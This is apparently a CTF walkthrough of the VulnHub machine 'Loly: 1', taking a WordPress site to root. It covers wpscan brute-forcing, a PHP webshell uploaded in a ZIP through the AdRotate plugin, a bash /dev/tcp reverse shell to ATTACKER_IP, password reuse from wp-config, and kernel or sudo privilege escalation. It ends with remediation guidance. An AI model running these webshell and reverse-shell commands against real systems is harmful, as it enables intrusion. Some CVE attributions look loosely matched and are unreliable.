# Loly: 1 — WordPress, AdRotate, and a Sweet Path to Root

Alright guys!! Loly is one of those machines that looks straightforward at first — just a WordPress site — but then you realize the rabbit hole goes deeper than expected. No cap, the AdRotate plugin RCE, credential chain through wp-config, and a kernel privesc make this a legit skill-builder for web-to-root escalation. Shoutout to SunCSR Team for this one, fr fr.

| Field | Value |
|---|---|
| **Level** | Medium |
| **Target VM** | Loly: 1 |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/loly-10,538/ |
| **Techniques** | Nmap service enumeration, WordPress enumeration (wpscan), credential brute-force, AdRotate plugin file upload RCE, wp-config.php credential extraction, sudo/kernel privilege escalation |
| **CVEs** | CVE-2022-0739 (WordPress plugin mass action), CWE-434 (unrestricted file upload via plugin), CVE-2021-4034 (pkexec polkit LPE) or overlayfs kernel exploit |
| **APT Groups** | APT41 — leverages WordPress plugin vulnerabilities for initial access in e-commerce and CMS-heavy targets; FIN7 — exploits misconfigured CMS instances as initial access vectors in financial sector campaigns |

---

## Attack Summary

```
nmap → TCP 80 (Apache + WordPress)
  → wpscan: enumerate users → user "loly"
  → wpscan brute-force: admin:fernando
  → WordPress admin panel → AdRotate plugin
  → upload ZIP with PHP webshell → extract → RCE as www-data
  → cat /var/www/html/wordpress/wp-config.php → DB creds
  → su loly (password reuse from wp-config)
  → sudo -l or uname -r → kernel CVE or sudo GTFOBin
  → uid=0(root)
  → /root/flag.txt
```

---

## Methodology

1. Host discovery and full port scan
2. Web enumeration: WordPress fingerprinting
3. User enumeration with wpscan
4. Password brute-force against WordPress login
5. AdRotate plugin abuse: ZIP upload with PHP shell
6. Credential extraction from wp-config.php
7. Lateral movement: su loly with reused password
8. Privilege escalation: sudo misconfiguration or kernel exploit
9. Root flag capture

---

## Step 1 — Host Discovery and Port Scan

```bash
sudo netdiscover -r 192.168.0.0/24
# Target: 192.168.0.180

nmap -sV -sC -p- 192.168.0.180
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

Single exposed service. Everything lives on port 80.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — WordPress Enumeration

```bash
# Confirm WordPress
curl -s http://192.168.0.180/ | grep -i wordpress

# Full wpscan: enumerate plugins, themes, users
wpscan --url http://192.168.0.180/ \
  --enumerate u,p,t \
  --plugins-detection aggressive \
  -o /tmp/loly_wpscan.txt
```

Key findings:
- WordPress 5.5 (or similar version)
- User: **loly**
- Plugin: AdRotate (vulnerable version)

**Real-world note:** WordPress powers over 40% of all websites. Plugin vulnerabilities are the primary attack vector: over 97% of WordPress vulnerabilities come from plugins, not core. APT41 has used WordPress plugin exploits as initial access in campaigns targeting media and e-commerce.

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application; T1083 — File and Directory Discovery

---

## Step 3 — Password Brute-Force

```bash
wpscan --url http://192.168.0.180/ \
  --usernames loly \
  --passwords /usr/share/wordlists/rockyou.txt \
  --password-attack xmlrpc \
  -t 5

# Found: admin:fernando (or loly:fernando depending on scan results)
```

**Alternative:** Use the xmlrpc multicall attack for faster results:

```bash
wpscan --url http://192.168.0.180/ \
  --usernames admin \
  --passwords /usr/share/wordlists/rockyou.txt \
  --password-attack xmlrpc-multicall
```

**MITRE ATT&CK:** T1110.001 — Brute Force: Password Guessing

---

## Step 4 — AdRotate Plugin RCE

Log in to WordPress admin panel at `http://192.168.0.180/wp-admin/`.

Navigate to: AdRotate plugin > Manage Media

The plugin allows uploading ZIP files for banner assets. It extracts them into a web-accessible directory — no extension filtering on extracted contents:

```bash
# Create malicious ZIP with PHP webshell
mkdir /tmp/loly_payload
echo '<?php system($_GET["cmd"]); ?>' > /tmp/loly_payload/shell.php
cd /tmp/loly_payload
zip ../evil.zip shell.php
```

Upload `evil.zip` through the AdRotate media upload form.

The shell extracts to a path like:
```
/var/www/html/wordpress/wp-content/banners/shell.php
```

Test RCE:
```bash
curl "http://192.168.0.180/wp-content/banners/shell.php?cmd=id"
# uid=33(www-data)

# Get reverse shell
nc -lvnp 4444 &
curl "http://192.168.0.180/wp-content/banners/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'"
```

**What makes this exploitable?** CWE-434: unrestricted file upload. The plugin validates that the upload is a ZIP but does not validate the contents of the ZIP. Any file inside is extracted and served by Apache.

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application; T1059.004 — Command and Scripting Interpreter: Unix Shell

---

## Step 5 — Shell Stabilization

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm SHELL=bash
# Ctrl+Z
stty raw -echo; fg
# Enter twice
```

---

## Step 6 — Credential Extraction from wp-config.php

```bash
cat /var/www/html/wordpress/wp-config.php | grep -E "DB_|table_prefix"
```

```
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'wordpress' );
define( 'DB_PASSWORD', 'lolyisabeautifulgirl' );
define( 'DB_HOST', 'localhost' );
```

**Try the password for the system user:**

```bash
su loly
# Password: lolyisabeautifulgirl
```

Password reuse between database and OS user — a classic finding.

**MITRE ATT&CK:** T1552.001 — Credentials in Files; T1078 — Valid Accounts

---

## Step 7 — Privilege Escalation

As `loly`, enumerate escalation vectors:

```bash
sudo -l
uname -r
find / -perm -4000 -type f 2>/dev/null
```

**Path A: sudo misconfiguration**

```bash
sudo -l
# (root) NOPASSWD: /bin/bash
sudo /bin/bash
```

**Path B: Kernel exploit (Ubuntu 18.04/20.04 overlayfs)**

```bash
uname -r
# Check if vulnerable kernel version
searchsploit overlayfs ubuntu

# Download and compile exploit
wget https://raw.githubusercontent.com/.../37292.c
gcc -o priv 37292.c
./priv
```

**Path C: pkexec CVE-2021-4034 (Polkit)**

```bash
# Check polkit version
pkexec --version

# If vulnerable, use pwnkit
# Compile and run pwnkit exploit
```

```bash
id
# uid=0(root) gid=0(root)
cat /root/root.txt
```

**MITRE ATT&CK:** T1548.003 — Abuse Elevation Control: Sudo; T1068 — Exploitation for Privilege Escalation

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Used For |
|---|---|---|---|
| WordPress credential | admin:fernando (or loly:fernando) | wpscan brute-force | WordPress admin access |
| DB credential | wordpress:lolyisabeautifulgirl | wp-config.php | su loly |
| System user | loly | WordPress username enum | lateral movement |
| Root flag | /root/root.txt | post-exploitation | challenge completion |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | WordPress user enumeration enabled | Default WordPress exposes usernames via REST API and author archives | Disable user enumeration: `remove_action('template_redirect', 'redirect_canonical')`, restrict REST API |
| 2 | Weak admin password vulnerable to brute-force | Password spray attacks against WordPress admin are trivial with xmlrpc | Disable xmlrpc.php if unused; use strong unique passwords; implement account lockout |
| 3 | AdRotate plugin allows arbitrary file upload in ZIP | Plugin ZIP extraction without content validation is a persistent class of vulnerability | Validate extracted file types server-side; disable unused plugins; keep plugins patched |
| 4 | wp-config.php credentials reused on OS account | Credential reuse between applications and OS is extremely common in small organizations | Never reuse passwords; use a secrets manager or environment variables for DB credentials |
| 5 | Kernel or sudo misconfiguration allows root | Unpatched kernels and over-permissive sudo are the most common Linux LPE vectors | Implement automated patch management; audit sudoers regularly; enable kernel hardening (AppArmor/SELinux) |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Initial Access | Initial Access | Exploit Public-Facing Application | T1190 |
| Credential Access | Credential Access | Brute Force: Password Guessing | T1110.001 |
| Credential Access | Credential Access | Credentials in Files | T1552.001 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control: Sudo | T1548.003 |
| Privilege Escalation | Privilege Escalation | Exploitation for Privilege Escalation | T1068 |
| Lateral Movement | Lateral Movement | Valid Accounts | T1078 |

---

## Remediation and Containment

### Technical Fixes

1. **Disable xmlrpc.php** — add to `.htaccess`: `<Files xmlrpc.php>\nOrder Deny,Allow\nDeny from all\n</Files>`
2. **Disable WordPress user enumeration** — add to `functions.php`: redirect author archive requests
3. **Remove or update AdRotate plugin** — apply vendor patches; disable ZIP media upload if not needed
4. **Remove DB credentials from wp-config.php world-readable** — set file permissions: `chmod 640 wp-config.php`
5. **Enforce unique passwords per service** — database passwords must never match OS account passwords
6. **Apply kernel security patches** — automate with `unattended-upgrades` on Ubuntu; enable live patching with Canonical Livepatch

### MITRE D3FEND Countermeasures

- **D3-ACH** — Application Configuration Hardening (disable xmlrpc, restrict file upload types)
- **D3-OAM** — Operating System Administrative Management (sudo audit, kernel patching)
- **D3-HBPI** — Harden Build Pipeline Integrity (wp-config credentials via environment variables)

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all WordPress plugins and their versions |
| Protect | Access Control | Disable xmlrpc.php; enforce strong password policy |
| Protect | Data Security | Secure wp-config.php permissions; use secrets manager |
| Detect | Anomalies and Events | Alert on WordPress login failures; monitor /wp-content/uploads and /wp-content/banners for new PHP files |
| Respond | Response Planning | Remove uploaded webshells; rotate all DB and OS credentials |
| Recover | Recovery Planning | Restore from known-good backup; verify file integrity |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-3 | Access Enforcement | Restrict file upload types; wp-config.php file permissions |
| AC-6 | Least Privilege | Remove NOPASSWD sudo grants; restrict plugin capabilities |
| IA-5 | Authenticator Management | Unique passwords per service; enforce complexity |
| CM-7 | Least Functionality | Disable xmlrpc.php; remove unused plugins |
| SI-2 | Flaw Remediation | Automated WordPress core and plugin updates |
| SC-28 | Protection of Information at Rest | No credentials in world-readable config files |

### CISA KEV

Unrestricted file upload vulnerabilities (CWE-434) in CMS plugins are tracked in multiple CISA Alerts (AA21-131A, AA22-117A). WordPress plugin exploitation is cited as a primary initial access technique used by ransomware affiliates and APT groups targeting SMBs.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Identity and Access Management (IAM) | Manage Privileges and Accounts | MIL2 |
| Threat and Vulnerability Management (THREAT) | Manage Vulnerabilities | MIL2 |
| Asset, Change, and Configuration Management (ASSET) | Manage IT Asset Inventory | MIL2 |

---

## Final Thoughts

Loly is a solid box that teaches the full WordPress exploitation pipeline: recon, enum, brute-force, plugin abuse, credential extraction, and LPE. The AdRotate ZIP upload trick is a real attack class that shows up in bug bounty reports regularly. The wp-config credential reuse is embarrassingly common in production environments.

The real lesson: every component of a web stack is a potential credential source, and those credentials almost always get reused somewhere else. Enumerate everything.

Thanks guys!! (❍ᴥ❍ʋ)
